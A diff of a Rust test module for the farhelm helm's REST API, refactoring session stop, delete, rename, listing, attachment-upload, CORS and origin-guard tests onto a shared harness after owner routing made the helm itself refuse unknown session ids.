-    /// extra context, none of which "verbatim" allows.
+    /// This contract INVERTED with PLAN_M6.md item 5, and the inversion is
+    /// the point of keeping the test. Before owner routing, an unknown id
+    /// was the supervisor's question to answer, and this test pinned the
+    /// verbatim passthrough of its 404. Now the helm resolves a session's
+    /// owning host in its merged view first, so an id nobody owns has no
+    /// host to ask — answering it locally is not an optimization but the
+    /// only honest thing available, since "which supervisor would you even
+    /// forward this to" has no answer.
+    ///
+    /// Both halves are asserted: the status and body a caller sees, and —
+    /// through [`silent_supervisor`] — that the connected host was not
+    /// asked. Without the second half a helm that forwarded the request AND
+    /// answered locally would pass.
     #[tokio::test]
     async fn stop_session_unknown_id_returns_404_with_supervisor_message() {
-        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
-        use farhelm_proto::{ControlMsg, ErrorKind};
         use tower::ServiceExt;
 
-        const SENTINEL: &str = "SENTINEL-stop-9f3ac2: no such session";
-
         let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
-        let peer = tokio::spawn(async move {
-            let (r, w) = tokio::io::split(peer_side);
-            let mut reader = FrameReader::new(r);
-            let mut writer = FrameWriter::new(w);
-            handshake(&mut reader, &mut writer, "supervisor")
-                .await
-                .unwrap();
-            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
-            let ControlMsg::StopSession { req_id, .. } = request else {
-                panic!("expected StopSession, got {request:?}");
-            };
-            writer
-                .write_control(&ControlMsg::Error {
-                    req_id,
-                    message: SENTINEL.to_string(),
-                    kind: ErrorKind::NotFound,
-                })
-                .await
-                .unwrap();
-        });
+        let peer = tokio::spawn(silent_supervisor(peer_side));
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
 
         let request = axum::http::Request::builder()
             .method("POST")
@@ -2920,8 +3589,8 @@ mod tests {
             .unwrap();
         assert_eq!(
             String::from_utf8_lossy(&body),
-            SENTINEL,
-            "body must carry the supervisor's own message verbatim, not a substring of it"
+            "no such session: sess-missing",
+            "the helm's own refusal must name the id it could not place"
         );
 
         peer.await.unwrap();
@@ -2955,9 +3624,8 @@ mod tests {
                 .unwrap();
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
 
         let request = axum::http::Request::builder()
             .method("DELETE")
@@ -2977,44 +3645,20 @@ mod tests {
         peer.await.unwrap();
     }
 
-    /// Deleting an unknown id must 404 with the supervisor's message
-    /// verbatim, the delete-side twin of
+    /// Deleting an unknown id must 404 from the helm's own owner lookup,
+    /// the delete-side twin of
     /// `stop_session_unknown_id_returns_404_with_supervisor_message` — see
-    /// that test's docs for why the assertion checks the complete body
-    /// against a sentinel rather than a generic substring.
+    /// that test's docs for why this contract inverted with M6's routing,
+    /// and why the silent supervisor is half the assertion.
     #[tokio::test]
     async fn delete_session_unknown_id_returns_404_with_supervisor_message() {
-        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
-        use farhelm_proto::{ControlMsg, ErrorKind};
         use tower::ServiceExt;
 
-        const SENTINEL: &str = "SENTINEL-delete-7b1e04: no such session";
-
         let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
-        let peer = tokio::spawn(async move {
-            let (r, w) = tokio::io::split(peer_side);
-            let mut reader = FrameReader::new(r);
-            let mut writer = FrameWriter::new(w);
-            handshake(&mut reader, &mut writer, "supervisor")
-                .await
-                .unwrap();
-            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
-            let ControlMsg::DeleteSession { req_id, .. } = request else {
-                panic!("expected DeleteSession, got {request:?}");
-            };
-            writer
-                .write_control(&ControlMsg::Error {
-                    req_id,
-                    message: SENTINEL.to_string(),
-                    kind: ErrorKind::NotFound,
-                })
-                .await
-                .unwrap();
-        });
+        let peer = tokio::spawn(silent_supervisor(peer_side));
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
 
         let request = axum::http::Request::builder()
             .method("DELETE")
@@ -3030,77 +3674,33 @@ mod tests {
             .unwrap();
         assert_eq!(
             String::from_utf8_lossy(&body),
-            SENTINEL,
-            "body must carry the supervisor's own message verbatim, not a substring of it"
+            "no such session: sess-missing",
+            "the helm's own refusal must name the id it could not place"
         );
 
         peer.await.unwrap();
     }
 
-    /// `GET /api/sessions` now serializes the WHOLE `SessionListing`, not
-    /// just the bare `sessions` array (PLAN_M2.md step 6) — this pins the
-    /// object shape end to end, with a sentinel `total` value deliberately
-    /// far from `sessions.len()` so a regression that drops the field, or
-    /// recomputes `total` from the list length instead of forwarding the
-    /// supervisor's own count, shows up immediately. `truncated` in the
-    /// JSON body is REST-facing (`SessionListing::truncated`, PLAN_M6.md
-    /// item 1's docs) rather than read straight off the wire — the mock
-    /// supervisor below sends a `next_cursor: Some(_)` for the client to
-    /// translate, not a `truncated` field the wire no longer carries.
+    /// `GET /api/sessions`'s JSON shape, which the UI decodes and which
+    /// PLAN_M6.md item 5 extended without breaking.
     ///
-    /// This test's `total: 42` fixture leaves BOTH of
-    /// `SessionListing::truncated`'s synthesis disjuncts true at once
-    /// (`next_cursor.is_some()` and `sessions.len() < total`), so it is
-    /// NOT a claim that either disjunct individually drives the `true`
-    /// below — that isolation lives at the `SupervisorClient::list_sessions`
-    /// layer (`client.rs`'s
-    /// `list_sessions_reports_truncated_from_next_cursor_alone` and
-    /// `list_sessions_reports_truncated_from_a_larger_total_alone`), which
-    /// this HTTP handler calls through unmodified. What this test alone
-    /// covers is narrower: that the JSON body actually carries `total` and
-    /// `truncated` as top-level fields, forwarded rather than dropped or
-    /// recomputed from `sessions.len()`, over a real HTTP round trip.
+    /// Two halves, both load-bearing for the UI PRs that follow. The M2
+    /// envelope (`sessions`/`total`/`truncated`) is still there under the
+    /// same names, so the list UI in this tree keeps decoding it unchanged;
+    /// and each row now carries `host`/`host_name`/`stale` as ADDITIVE
+    /// siblings of the session's own fields, never nested under a wrapper —
+    /// which is the whole reason `SessionRow` flattens `SessionInfo`
+    /// instead of embedding it.
+    ///
+    /// Asserted on raw JSON rather than a decoded type, because the UI
+    /// decodes JSON: a serialization change that a round trip through the
+    /// same Rust types would hide is exactly what would break the list in
+    /// the browser.
     #[tokio::test]
-    async fn list_sessions_returns_full_listing_object_shape() {
-        use farhelm_proto::ControlMsg;
-        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
-
-        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
-        let peer = tokio::spawn(async move {
-            let (r, w) = tokio::io::split(peer_side);
-            let mut reader = FrameReader::new(r);
-            let mut writer = FrameWriter::new(w);
-            handshake(&mut reader, &mut writer, "supervisor")
-                .await
-                .unwrap();
-            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
-            let ControlMsg::ListSessions { req_id, .. } = request else {
-                panic!("expected ListSessions, got {request:?}");
-            };
-            writer
-                .write_control(&ControlMsg::SessionList {
-                    req_id,
-                    sessions: vec![farhelm_proto::SessionInfo {
-                        id: "sess-1".into(),
-                        title: "sess-1".into(),
-                        created_at: 1_700_000_000,
-                        cwd: "/sess-1".into(),
-                        invocation: "agent".into(),
-                        status: farhelm_proto::SessionStatus::Alive,
-                        annotation: None,
-                        restart_offer: farhelm_proto::RestartOffer::default(),
-                        tabs: Vec::new(),
-                    }],
-                    total: 42,
-                    next_cursor: Some("opaque-cursor-value".to_string()),
-                })
-                .await
-                .unwrap();
-        });
-
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+    async fn list_sessions_returns_the_merged_listing_object_shape() {
+        let harness =
+            rest_harness::helm_listing(vec![rest_harness::session("sess-1", 1_700_000_000)]).await;
+        let app = harness.router();
 
         let request = axum::http::Request::builder()
             .method("GET")
@@ -3115,11 +3715,32 @@ mod tests {
             .await
             .unwrap();
         let value: serde_json::Value = serde_json::from_slice(&body).unwrap();
-        assert_eq!(value["total"], 42);
-        assert_eq!(value["truncated"], true);
-        assert_eq!(value["sessions"][0]["id"], "sess-1");
+        assert_eq!(value["total"], 1, "total counts the merged view");
+        assert_eq!(
+            value["truncated"], false,
+            "one page held everything, so there is no next page"
+        );
+        assert_eq!(value["next_cursor"], serde_json::Value::Null);
 
-        peer.await.unwrap();
+        let row = &value["sessions"][0];
+        assert_eq!(row["id"], "sess-1");
+        assert_eq!(
+            row["title"], "sess-1",
+            "the session's own fields stay at the row's top level"
+        );
+        assert_eq!(
+            row["host"],
+            rest_harness::local_id(&harness.store).await,
+            "every row names the host it lives on"
+        );
+        assert_eq!(
+            row["host_name"], "this machine",
+            "the reserved local row is described, never addressed"
+        );
+        assert_eq!(
+            row["stale"], false,
+            "a connected host's rows are live knowledge"
+        );
     }
 
     /// `GET /api/sessions/{id}` — the session-detail route a session view
@@ -3133,48 +3754,15 @@ mod tests {
     /// LISTING route, which no session view reads tabs from.
     #[tokio::test]
     async fn get_session_passes_a_non_empty_tabs_list_through() {
-        use farhelm_proto::ControlMsg;
-        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
-
-        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
-        let peer = tokio::spawn(async move {
-            let (r, w) = tokio::io::split(peer_side);
-            let mut reader = FrameReader::new(r);
-            let mut writer = FrameWriter::new(w);
-            handshake(&mut reader, &mut writer, "supervisor")
-                .await
-                .unwrap();
-            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
-            let ControlMsg::ListSessions { req_id, .. } = request else {
-                panic!("expected ListSessions, got {request:?}");
-            };
-            writer
-                .write_control(&ControlMsg::SessionList {
-                    req_id,
-                    sessions: vec![farhelm_proto::SessionInfo {
-                        id: "sess-1".into(),
-                        title: "sess-1".into(),
-                        created_at: 1_700_000_000,
-                        cwd: "/sess-1".into(),
-                        invocation: "agent".into(),
-                        status: farhelm_proto::SessionStatus::Alive,
-                        annotation: None,
-                        restart_offer: farhelm_proto::RestartOffer::default(),
-                        tabs: vec![
-                            farhelm_proto::TabInfo { id: "tab-1".into() },
-                            farhelm_proto::TabInfo { id: "tab-2".into() },
-                        ],
-                    }],
-                    total: 1,
-                    next_cursor: None,
-                })
-                .await
-                .unwrap();
-        });
-
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::helm_listing(vec![farhelm_proto::SessionInfo {
+            tabs: vec![
+                farhelm_proto::TabInfo { id: "tab-1".into() },
+                farhelm_proto::TabInfo { id: "tab-2".into() },
+            ],
+            ..rest_harness::session("sess-1", 1_700_000_000)
+        }])
+        .await;
+        let app = harness.router();
 
         let request = axum::http::Request::builder()
             .method("GET")
@@ -3193,8 +3781,15 @@ mod tests {
             value["tabs"],
             serde_json::json!([{"id": "tab-1"}, {"id": "tab-2"}])
         );
-
-        peer.await.unwrap();
+        assert_eq!(
+            value["stale"], false,
+            "a connected host's detail is live, and says so"
+        );
+        assert_eq!(
+            value["host"],
+            rest_harness::local_id(&harness.store).await,
+            "the detail route carries the same host fields a list row does"
+        );
     }
 
     /// The helm is a passthrough for classification, and PLAN_M3.md item 2
@@ -3210,55 +3805,33 @@ mod tests {
     /// because the UI decodes JSON, not proto types: a serialization
     /// change that a round trip through the same Rust types would hide is
     /// precisely what would break the badge in the browser.
+    ///
+    /// As of PLAN_M6.md item 5 the claim is stronger than it was: these
+    /// rows now reach the browser by way of helm.db's session cache, so
+    /// they survive a serialize/store/deserialize round trip on the way.
+    /// A status variant or annotation field that failed to persist would
+    /// fail here too, which is exactly the coverage a durable cache of
+    /// supervisor-authored data needs.
     #[tokio::test]
     async fn list_sessions_passes_interrupted_status_and_stop_annotation_through() {
-        use farhelm_proto::ControlMsg;
-        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
-
-        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
-        let peer = tokio::spawn(async move {
-            let (r, w) = tokio::io::split(peer_side);
-            let mut reader = FrameReader::new(r);
-            let mut writer = FrameWriter::new(w);
-            handshake(&mut reader, &mut writer, "supervisor")
-                .await
-                .unwrap();
-            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
-            let ControlMsg::ListSessions { req_id, .. } = request else {
-                panic!("expected ListSessions, got {request:?}");
-            };
-            let session = |id: &str, status, annotation: Option<&str>| farhelm_proto::SessionInfo {
-                id: id.into(),
-                title: id.into(),
-                created_at: 1_700_000_000,
-                cwd: "/tmp".into(),
-                invocation: "agent".into(),
-                status,
-                annotation: annotation.map(str::to_string),
-                restart_offer: farhelm_proto::RestartOffer::default(),
-                tabs: Vec::new(),
-            };
-            writer
-                .write_control(&ControlMsg::SessionList {
-                    req_id,
-                    sessions: vec![
-                        session("lost", farhelm_proto::SessionStatus::Interrupted, None),
-                        session(
-                            "stopped",
-                            farhelm_proto::SessionStatus::Exited { exit_code: Some(0) },
-                            Some(farhelm_proto::STOP_ANNOTATION),
-                        ),
-                    ],
-                    total: 2,
-                    next_cursor: None,
-                })
-                .await
-                .unwrap();
-        });
-
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let session = |id: &str, status, annotation: Option<&str>| farhelm_proto::SessionInfo {
+            status,
+            annotation: annotation.map(str::to_string),
+            // `created_at` is shared, so the merged order falls to the id
+            // tiebreak — which is what fixes "lost" ahead of "stopped"
+            // below rather than leaving the two positions to chance.
+            ..rest_harness::session(id, 1_700_000_000)
+        };
+        let harness = rest_harness::helm_listing(vec![
+            session("lost", farhelm_proto::SessionStatus::Interrupted, None),
+            session(
+                "stopped",
+                farhelm_proto::SessionStatus::Exited { exit_code: Some(0) },
+                Some(farhelm_proto::STOP_ANNOTATION),
+            ),
+        ])
+        .await;
+        let app = harness.router();
 
         let request = axum::http::Request::builder()
             .method("GET")
@@ -3277,8 +3850,6 @@ mod tests {
         assert_eq!(value["sessions"][0]["annotation"], serde_json::Value::Null);
         assert_eq!(value["sessions"][1]["status"]["state"], "exited");
         assert_eq!(value["sessions"][1]["annotation"], "stopped by user");
-
-        peer.await.unwrap();
     }
 
     /// The DNS-rebinding origin guard is route-agnostic middleware, and the
@@ -3313,15 +3884,22 @@ mod tests {
             handshake(&mut reader, &mut writer, "supervisor")
                 .await
                 .unwrap();
+            // A bounded silence, not an EOF: the harness keeps this
+            // connection open for the whole test (see `rest_harness`), so
+            // "nothing reached the supervisor" is only observable as
+            // nothing ARRIVING. The window is generous because a false
+            // pass needs the frame to be merely late, and a stop that the
+            // middleware failed to refuse would be sent immediately.
+            let leaked = tokio::time::timeout(Duration::from_secs(2), reader.read_frame()).await;
             assert!(
-                reader.read_frame().await.unwrap().is_none(),
-                "stop request must never reach the supervisor for a foreign origin"
+                leaked.is_err(),
+                "stop request must never reach the supervisor for a foreign origin, but one \
+                 arrived: {leaked:?}"
             );
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
 
         let request = axum::http::Request::builder()
             .method("POST")
@@ -3380,9 +3958,8 @@ mod tests {
                 .unwrap();
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
 
         let request = axum::http::Request::builder()
             .method("POST")
@@ -3530,9 +4107,8 @@ mod tests {
                 .unwrap();
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
         let request = axum::http::Request::builder()
             .method("POST")
             .uri("/api/sessions/sess-1/restart")
@@ -3593,9 +4169,8 @@ mod tests {
                 .unwrap();
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
         let request = axum::http::Request::builder()
             .method("POST")
             .uri("/api/sessions/sess-1/restart")
@@ -3693,9 +4268,8 @@ mod tests {
                     .unwrap();
             });
 
-            let (r, w) = tokio::io::split(client_side);
-            let client = super::SupervisorClient::start(r, w).await.unwrap();
-            let app = build_router(client, None, 7433);
+            let harness = rest_harness::spliced_helm(client_side).await;
+            let app = harness.router();
             let request = axum::http::Request::builder()
                 .method("POST")
                 .uri("/api/sessions/sess-1/rename")
@@ -3758,9 +4332,8 @@ mod tests {
                 reader
             });
 
-            let (r, w) = tokio::io::split(client_side);
-            let client = super::SupervisorClient::start(r, w).await.unwrap();
-            let app = build_router(client, None, 7433);
+            let harness = rest_harness::spliced_helm(client_side).await;
+            let app = harness.router();
             let request = axum::http::Request::builder()
                 .method("POST")
                 .uri("/api/sessions/sess-1/rename")
@@ -3839,9 +4412,8 @@ mod tests {
                     .unwrap();
             });
 
-            let (r, w) = tokio::io::split(client_side);
-            let client = super::SupervisorClient::start(r, w).await.unwrap();
-            let app = build_router(client, None, 7433);
+            let harness = rest_harness::spliced_helm(client_side).await;
+            let app = harness.router();
             let request = axum::http::Request::builder()
                 .method("POST")
                 .uri("/api/sessions/sess-1/rename")
@@ -3864,50 +4436,19 @@ mod tests {
         }
     }
 
-    /// Renaming an unknown session must surface as a 404 carrying the
-    /// supervisor's own message verbatim, exactly the same `SupervisorError`
-    /// downcast every other route's 404 uses — exercised here for the
-    /// rename route specifically rather than assumed from `stop`'s coverage.
+    /// Renaming an unknown session must 404 from the helm's own owner
+    /// lookup, without reaching a supervisor — the rename-side twin of
+    /// `stop_session_unknown_id_returns_404_with_supervisor_message`, whose
+    /// docs carry the reasoning.
     #[tokio::test]
     async fn rename_session_unknown_id_returns_404_with_supervisor_message() {
-        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
-        use farhelm_proto::{ControlMsg, ErrorKind};
         use tower::ServiceExt;
 
-        const SENTINEL: &str = "SENTINEL-rename-7c2a: no such session";
-
         let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
-        let peer = tokio::spawn(async move {
-            let (r, w) = tokio::io::split(peer_side);
-            let mut reader = FrameReader::new(r);
-            let mut writer = FrameWriter::new(w);
-            handshake(&mut reader, &mut writer, "supervisor")
-                .await
-                .unwrap();
-            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
-            let ControlMsg::RenameSession {
-                req_id, session_id, ..
-            } = request
-            else {
-                panic!("expected RenameSession, got {request:?}");
-            };
-            assert_eq!(
-                session_id, "sess-missing",
-                "the route must forward the id from the URL path, not some other session"
-            );
-            writer
-                .write_control(&ControlMsg::Error {
-                    req_id,
-                    message: SENTINEL.to_string(),
-                    kind: ErrorKind::NotFound,
-                })
-                .await
-                .unwrap();
-        });
+        let peer = tokio::spawn(silent_supervisor(peer_side));
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
         let request = axum::http::Request::builder()
             .method("POST")
             .uri("/api/sessions/sess-missing/rename")
@@ -3925,8 +4466,8 @@ mod tests {
             .unwrap();
         assert_eq!(
             String::from_utf8_lossy(&body),
-            SENTINEL,
-            "body must carry the supervisor's own message verbatim, not a substring of it"
+            "no such session: sess-missing",
+            "the helm's own refusal must name the id it could not place"
         );
 
         peer.await.unwrap();
@@ -3967,9 +4508,8 @@ mod tests {
                 .unwrap();
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
         let request = axum::http::Request::builder()
             .method("POST")
             .uri("/api/sessions/sess-1/rename")
@@ -4026,9 +4566,8 @@ mod tests {
                 .unwrap();
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
 
         let request = axum::http::Request::builder()
             .method("POST")
@@ -4086,9 +4625,8 @@ mod tests {
                 .unwrap();
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
 
         let request = axum::http::Request::builder()
             .method("DELETE")
@@ -4148,9 +4686,8 @@ mod tests {
                 .unwrap();
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
 
         let request = axum::http::Request::builder()
             .method("POST")
@@ -4209,9 +4746,8 @@ mod tests {
                 .unwrap();
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
 
         let request = axum::http::Request::builder()
             .method("DELETE")
@@ -4323,9 +4859,8 @@ mod tests {
             }
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
 
         let request = axum::http::Request::builder()
             .method("POST")
@@ -4440,9 +4975,8 @@ mod tests {
             }
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
 
         let body_stream =
             futures_util::stream::iter(pieces.into_iter().map(Ok::<Vec<u8>, std::io::Error>));
@@ -4459,32 +4993,6 @@ mod tests {
         peer.await.unwrap();
     }
 
-    /// A supervisor connection that completes the handshake and then says
-    /// nothing, for the CORS tests whose requests never reach a handler.
-    ///
-    /// `build_router` needs a live `SupervisorClient`, but a preflight is
-    /// answered by the route itself and a refused origin never gets past
-    /// the middleware — so scripting upload frames for either would be
-    /// scenery.
-    async fn idle_supervisor_client() -> Arc<super::SupervisorClient> {
-        use farhelm_proto::io::{FrameReader, FrameWriter, handshake};
-
-        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
-        tokio::spawn(async move {
-            let (r, w) = tokio::io::split(peer_side);
-            let mut reader = FrameReader::new(r);
-            let mut writer = FrameWriter::new(w);
-            handshake(&mut reader, &mut writer, "supervisor")
-                .await
-                .unwrap();
-            // Held open: dropping the peer would close the client and turn
-            // every later request into a transport error.
-            std::future::pending::<()>().await;
-        });
-        let (r, w) = tokio::io::split(client_side);
-        super::SupervisorClient::start(r, w).await.unwrap()
-    }
-
     /// The desktop build's `fetch` preflights before it may upload
     /// anything, because `fetch(url, {body: file})` sets a content type
     /// the CORS-simple rules do not cover. Without an `OPTIONS` route that
@@ -4498,7 +5006,9 @@ mod tests {
     async fn attachment_preflight_answers_the_desktop_webview_origin() {
         use tower::ServiceExt;
 
-        let app = build_router(idle_supervisor_client().await, None, 7433);
+        let harness = rest_harness::idle_helm().await;
+
+        let app = harness.router();
         let request = axum::http::Request::builder()
             .method("OPTIONS")
             .uri("/api/sessions/sess-1/attachments?filename=shot.png")
@@ -4575,9 +5085,8 @@ mod tests {
             }
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
         let request = axum::http::Request::builder()
             .method("POST")
             .uri("/api/sessions/sess-1/attachments?filename=shot.png")
@@ -4615,7 +5124,11 @@ mod tests {
         use farhelm_proto::{ControlMsg, ErrorKind};
         use tower::ServiceExt;
 
-        const SENTINEL: &str = "no such session: sess-gone";
+        // A SUPERVISOR-side refusal, aimed at a session the helm does know:
+        // an id the merged view has never heard of is refused by the helm
+        // itself now (PLAN_M6.md item 5), which would exercise the wrong
+        // path for a test about what a cross-origin page can READ.
+        const SENTINEL: &str = "the session's attachments directory is gone";
         let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
         let peer = tokio::spawn(async move {
             let (r, w) = tokio::io::split(peer_side);
@@ -4638,12 +5151,11 @@ mod tests {
                 .unwrap();
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
         let request = axum::http::Request::builder()
             .method("POST")
-            .uri("/api/sessions/sess-gone/attachments?filename=shot.png")
+            .uri("/api/sessions/sess-1/attachments?filename=shot.png")
             .header("host", "127.0.0.1:7433")
             .header("origin", "dioxus://index.html")
             .header("content-length", "4")
@@ -4675,7 +5187,9 @@ mod tests {
     async fn a_foreign_origin_is_refused_without_cors_headers() {
         use tower::ServiceExt;
 
-        let app = build_router(idle_supervisor_client().await, None, 7433);
+        let harness = rest_harness::idle_helm().await;
+
+        let app = harness.router();
         let request = axum::http::Request::builder()
             .method("POST")
             .uri("/api/sessions/sess-1/attachments?filename=shot.png")
@@ -4746,9 +5260,8 @@ mod tests {
                 .unwrap();
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
 
         let request = axum::http::Request::builder()
             .method("POST")
@@ -4824,9 +5337,8 @@ mod tests {
             );
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
 
         let body_stream = futures_util::stream::iter(vec![
             Ok::<Vec<u8>, std::io::Error>(vec![1u8; declared as usize]),
@@ -4917,9 +5429,8 @@ mod tests {
                     .unwrap();
             });
 
-            let (r, w) = tokio::io::split(client_side);
-            let client = super::SupervisorClient::start(r, w).await.unwrap();
-            let app = build_router(client, None, 7433);
+            let harness = rest_harness::spliced_helm(client_side).await;
+            let app = harness.router();
 
             // Four bytes against a declared ten: a body that ends early
             // without the transport ever erroring.
@@ -4978,9 +5489,8 @@ mod tests {
             (reader, writer)
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
         let (mut peer_reader, mut peer_writer) = peer.await.unwrap();
 
         let request = axum::http::Request::builder()
@@ -5121,9 +5631,8 @@ mod tests {
             );
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
 
         // A stream that yields the partial body and then a hard error —
         // the disconnect. `into` converts each item's error into the
@@ -5202,9 +5711,8 @@ mod tests {
                 .unwrap();
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
 
         let request = axum::http::Request::builder()
             .method("POST")
@@ -5283,9 +5791,8 @@ mod tests {
             (reader, writer)
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
 
         // The sender is held for the whole test, so the body stream stays
         // pending after its one chunk rather than ending.
@@ -5375,9 +5882,8 @@ mod tests {
             (reader, writer)
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
 
         // The body ends normally, so the relay proceeds to commit — into
         // a supervisor that has already given up and will never answer.
@@ -5452,9 +5958,8 @@ mod tests {
             );
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
 
         // Bounded rather than truly endless: a per-item rearm bug must
         // fail this test on the outcome, not hang the suite. 300 virtual
@@ -5520,9 +6025,8 @@ mod tests {
             (reader, writer)
         });
 
-        let (r, w) = tokio::io::split(client_side);
-        let client = super::SupervisorClient::start(r, w).await.unwrap();
-        let app = build_router(client, None, 7433);
+        let harness = rest_harness::spliced_helm(client_side).await;
+        let app = harness.router();
         let (mut peer_reader, mut peer_writer) = peer.await.unwrap();
 
         let request = axum::http::Request::builder()
@@ -5575,20 +6079,26 @@ mod tests {
         );
     }
 
-    /// A `BeginUpload` refusal (unknown session, admission cap, any
-    /// supervisor-side precondition) must reach the browser through the
-    /// same `http_error` mapping every other endpoint uses, with the
